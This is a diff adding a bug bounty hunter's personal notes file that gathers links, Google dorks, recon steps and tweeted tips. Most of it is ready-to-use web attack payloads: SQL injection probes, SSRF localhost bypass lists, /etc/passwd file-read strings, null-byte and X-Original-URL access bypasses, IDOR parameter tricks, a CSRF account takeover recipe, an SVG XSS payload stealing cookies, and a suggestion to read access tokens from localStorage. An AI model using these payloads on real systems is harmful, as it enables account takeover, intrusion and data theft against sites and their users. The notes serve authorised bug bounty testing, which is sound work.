@@ -1,0 +1,405 @@
+https://github.com/S3cur3Th1sSh1t/Pentest-Tools => Automated Tools
+"security.txt" filetype:txt  --> It Gives new Target So less Competition In Bug bounties
+responsible disclosure
+Zerocopter = like bugcrowd less traffic bounty in Euros
+Intigriti
+Yeswehack
+Bugcrowd
+Hackerone
+synack
+cobalt.io
+https://github.com/Cyb3r-N3rd/bugbountyDorks => find all bug Bounty Sites using Dorks
+inurl:nl => For hacking dutch government
+Example google dorks: 
+"powered by hackerone" "submit vulnerability report"
+inurl:'/.well-known/security' ext:txt intext:hackerone
+"powered by bugcrowd" -site:http://bugcrowd.com
+
+If got a Ftp server of a website and files are not downloading then
+bypass it with the null filter =>
+xyz.com/ftp/file.bak%2500.pdf // it download the desired file into pdf
+breking down the null pointer %25= % in url encoding & 00 is 00 So %00 in url encoded = %2500
+
+autorize in burp suite to use Hunt for idor
+
+XSShunitng to next level => xsshunter.com // also checks for blind xss
+
+https://github.com/heilla/SecurityTesting/blob/master/HuntingCheckList.md => XSS RAT Sugeestions for Bug hunting tools N Recon
+
+https://github.com/heilla/SecurityTesting/blob/master/Multi%20target%20recon.md => More tools for bug hunting
+
+------------------------------------------------Information Disclosure------------------------------------
+
+Find information disclosure vulnerabilities by changing the header.
+
+Change it to:
+
+Accept: application/json, text/javascript, */*; q=0.01 
+
+Some vulnerable servers reveal server version information, stack and route information
+
+
+
+---------------------------------Recon------------------------------
+
+My recon starts with like first I gather subdomain using Amass, Asstefinder then send subdomains to httprobe for checking which is alive and then I check for open ports using nmap then at last I take screenshot using eyewitness
+
+Amass = for Vulnerability Scanning
+Fufuzz = port scanning
+https://www.hetzner.com/de/ = Cloud 
+recon-ng = For recon
+j2ee , json beautifier = burp Extension
+
+Youtuber's to follow => 0xlubin , PinkDraconian, Superhero1, HacksPlained, Zeus cybersec , Cryptolama
+
+https://github.com/KathanP19/HowToHunt =>  how to hunt a Target Please look at this
+https://cobalt.io/vulnerability-wiki/v12-files-resources
+
+https://github.com/abhinavprasad47/bugbounty-starter-notes  =>Start Notes
+
+Download Reflection and sentinal plugin for burp. => For Reflected xss
+
+
+
+https://github.com/th3cyb3rc0p?after=Y3Vyc29yOnYyOpK5MjAyMC0wOS0yN1QyMzozNzoxNyswNTozMM4R075v&tab=repositories => Mayur Bhai's Github
+
+https://www.hackerone.com/blog/100-hacking-tools-and-resources => top 100 tools
+
+https://github.com/eslam3kl/3klCon => Automate tool to find medium bugs
+
+https://medium.com/@patelkathan22/beginners-guide-on-how-you-can-use-javascript-in-bugbounty-492f6eb1f9ea
+
+https://book.hacktricks.xyz/pentesting-web/file-upload => all tips N tricks for most of vulnerabilities
+
+https://hackerone.com/reports/390 => Pixel Flood Attack
+
+https://www.hackingarticles.in/android-pentest-lab-setup-adb-command-cheatsheet/
+
+{
+SSRF is lob 🥂
+Subfinder > waybackurls > Arjun > SSRF > LFI
+Found reference parameter
+xxx?reference=file://\/\/etc/passwd 
+}
+
+Account takeover
+
+{"password":"1234",token="123"} -> 200 OK
+
+https://orwaatyat.medium.com/your-full-map-to-github-recon-and-leaks-exposure-860c37ca2c82 => github dorking
+{"password":"1234","email":"victm@gm.com","token="123"} -> 200 OK
+
+Account Takeover via change in Email(parameter) via OTP verification
+Link = https://avanishpathak46.medium.com/an-interesting-account-takeover-vulnerability-a1fbec0e01a
+
+Duplicate email vulnerabilities exist in some companies.
+
+email@gmail.com
+email+1@gmail com
+emai.l@gmail.com
+
+
+Browser-Based application LFI
+file:///etc/passwd blacklisted? Use "view-source:file:///etc/passwd"
+"view-source" is often forgotten by developers in blacklists. 
+
+waybackurls always rockxxRed heart, got awarded $$$$ for Account takeover.
+1. waybackurls target > waybck.txt
+2. found an unauth endpoint: target/api/reset?user=--id-here--&type=email
+3. page accepting new email and passwordFace with rolling eyes
+4. tried by entering my userid, new email and password
+5. changed successfully, means endpoint workingFace with tongue
+6. now the thing is how to bypass password restrictionDisappointed face
+7. tried response interception etc, nothing workedUnamused face
+8. then removed password parameter in proxy, and forwarded
+BoomFire!!! Email changed successfully.Sun with face
+
+Complete Application Secure against IDOR still found one IDOR
+1) capture request to delete user data
+2) change method from DELETE=>GET
+3)  send request and observe that you are able to view data 
+4) change I'd with other user's & observe
+
+This is how to find sql-Injection 100% of the time
+/?q=1
+/?q=1'
+/?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1'||'asd'||'   <== concat string
+/?q=1' or '1'='1
+/?q=1 or 1=1
+/?q='or''='
+
+(1/4)
+SSRF Bypass list for localhost (127.0.0.1)
+
+http://127.1/
+http://0000::1:80/
+http://[::]:80/
+http://2130706433/
+http://whitelisted@127.0.0.1
+http://0x7f000001/
+http://017700000001
+http://0177.00.00.01
+
+(2/4)
+http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
+http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
+http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
+http://②⑧⑤②⓪③⑨①⑥⑥:80/
+http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/ 
+http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/
+http://0xd8.0x3a.0xd6.0xe3
+
+(3/4)
+http://0xd83ad6e3
+http://0xd8.0x3ad6e3
+http://0xd8.0x3a.0xd6e3
+http://0330.072.0326.0343
+http://000330.0000072.0000326.00000343
+http://033016553343
+http://3627734755
+http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
+http://216.0x3a.00000000326.0xe3
+
+(4/4)
+http://newyork.localtest.me
+http://mysite.localtest.me
+http://redirecttest.localtest.me
+http://sub1.sub2.sub3.localtest.me
+http://bugbounty.dod.network
+http://spoofed.burpcollaborator.net
+
+{“id”:111} --> 401 Unauthriozied
+{“id”:{“id”:111}} --> 200 OK
+
+POST /api/get customers
+Content-Type: application/json {“user_id”:<attacker_id>,”user_id”:<victim’s_id>}
+
+GET /api_v1/messages?user_id=VICTIM_ID --> 401 
+
+GET /api_v1/messages?user_id=attack&user_id=VICTIM --> 200 OK
+
+Open Redirect
+https://www.vulndomain/oauth/login?redirectUrl=http://example.com\\
+@www
+.vulndomain.com/
+
+https://hackerone.com/reports/505424 => Twitter ID Reveal Sript
+
+Let
+Victim' creds:
+Email: victim@gmail.com
+Username: victim
+Now attacker came, signed up with following creds:
+Email: attacker@gmail.com
+Username: victim@gmail.com (special characters validation bypassed)Smiling face with horns
+
+Access control vuln with blocked access can be bypassed by adding the X-Original-URL header in the request. 
+
+POST /admin/deletecustomer HTTP/1.1 -> 403
+
+POST / HTTP/1.1 
+X-Original-URL: /admin/deletecustomer -> 200OK 
+
+
+A simple Email Verification Bypass:
+
+Signup with email , open email verification link with jwt token, set the password, capture the request in burp, change email in response. 
+
+Redirected to account dashboard with changed email.
+
+
+How to find local file read vuln based on cookies.
+
+Request
+GET /vulnerable.php HTTP/1.1
+Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
+
+Response
+HTTP/1.1 200 OK 
+...
+Server Apache 2.4 root:fi3sER6:0:1:System Operator:/:/bin/ksh//
+
+
+
+
+I got db_host , db_name , db_password of a website through directory search
+
+Tools : amass , dirsearch
+
+1) find subdomains
+2) then use dirsearch on every subdomain
+
+Url : http://subdomain.example.com/.env
+
+
+
+In love with SSRF through reverse proxy misconfiguration. Got almost 25 SSRFs in 3 4 days.
+Methodology:
+1. Identify any reverse proxy, like(nginx, cloudfront etc)
+(18 subdomains/targets were using nginx)
+2. Change Host: <targer> to burp-collab
+3. If it loads burp-collab response
+Try accessing localhost/cloud instance
+
+CSRF Account Takeover
+ATO using CSRF
+-Account setting-password change option 
+-We need current password to change new password 
+-capture the request,remove current password and CSRF-Token paramater 
+-Generate CSRF poc 
+-Send it to victim and victim password go changed 
+Use same.method with Email change 
+Bug: Client Side validation Bypass 
++ Account takover using CSRF
+[using change password and change email]
+
+
+Upload Filter Bypass and Upload a svg file using 
+
+Svg File Payload Uploaded Here :
+<?xml version=”1.0" standalone=”no”?>
+<!DOCTYPE svg PUBLIC “-//W3C//DTD SVG 1.1//EN” “http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version=”1.1" baseProfile=”full” xmlns=”http://www.w3.org/2000/svg">
+<polygon id=”triangle” points=”0,0 0,50 50,0" fill=”#009901" stroke=”#004400"/>
+<script type=”text/javascript”>
+alert(document.cookie);
+</script>
+</svg>
+
+XXE to XSS
+
+Bug = filter bypass open redirect
+
+URL = /?u=http://evil[.]com
+redirect_to=//evil.com\@whiteliste.com
+Warining you cannot redirect to evil it is unsafe URL 
+Bypass redirect without warining 
+
+URL = /?u=hTTp://evil[.]com
+
+It is redirect to evil
+
+I just change tt small to TT capital
+
+site:http://codepad.co "company"
+site:http://scribd.com "company"
+site:http://npmjs.com "company"
+site:http://npm.runkit.com "company"
+site:http://libraries.io "company"
+site:http://ycombinator.com "company"
+site:http://coggle.it "company"
+
+1/3
+4:43 PM · Dec 4, 2020·Twitter Web App
+445
+ Retweets
+27
+ Quote Tweets
+1.2K
+ Likes
+Ahsan Khan
+@hunter0x7
+·
+Dec 4, 2020
+Replying to 
+@hunter0x7
+site:http://papaly.com "company"
+site:http://google.com "company"
+site:http://trello.com "company"
+site:http://prezi.com "company"
+site:http://jsdelivr.net "company"
+site:http://codepen.io "company"
+site:http://codeshare.io "company"
+
+2/3
+Ahsan Khan
+@hunter0x7
+·
+Dec 4, 2020
+Replying to 
+@hunter0x7
+site:http://sharecode.io "company"
+site:http://pastebin.com "company"
+site:http://repl.it "company"
+site:http://productforums.google.com "company"
+site:http://gitter.im "company"
+site:http://bitbucket.org "company"
+site:*.atlassian.net "company"
+
+3/3
+Ahsan Khan
+@hunter0x7
+·
+Dec 4, 2020
+http://atlassian.net "company"
+inurl:gitlab "company"
+
+https://www.youtube.com/watch?v=K65e5QRQ1tc => find business level bugs
+https://twitter.com/harshbothra_/status/1354822724116389892
+
+When you upload image on target, always check if website exif data is leaking any sensitive data
+
+1. Upload image on <Target>
+3. Copy&Paste image address in http://exif.regex.info
+4. Report if you find any sensitive data like location,IP address etc,.
+
+Account takeover with JSON
+
+{"password":"1234",token="123"} -> 200 OK
+
+{"password":"1234","email":"victm@gm.com","token="123"} -> 200 OK
+
+Hidden email add
+
+
+
+Bug: Google Maps Api Key Disclosure with Lack of Security Configurations
+#bugbountytip: i used secretfinder tool to find sensitive data like apikeys, accesstoken, s3-bucket, etc in JavaScript files.
+if you found the key then use gmapscanner tool for determining whether a leaked/found Google Maps API Key is vulnerable to unauthorized access by other applications or not.
+
+Writeup:
+https://lnkd.in/d_4WSFR
+
+
+Instead of alert (document.domain) to popup for xss try to access tokens 
+Like 
+alert(localStorage.getItem('access_token'))
+May be u can get something, I hope.
+
+
+
+How to raise the impact of your HTML injection:
+
+<font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;
+
+BOOM!
+
+
+
+ATO without user interaction
+
+1) Go to login account
+2) invite users with email
+3) Capture request of invite and see response
+4) Invitation link leaks on response
+5) copy the invitation link on chrome.
+6) BOOM Collision symbol You get login without user interaction Face throwing a kiss
+
+
+
+
+35. Broken Access Control
+
+Bug type : Broken Access Control 
+
+1) go to profile pic change
+2) capture request in burp
+3) See Authorization Bearer token with JWT functionality
+4) Now change token with Victim Authorization token
+5) Profile Pic got changed of Victim
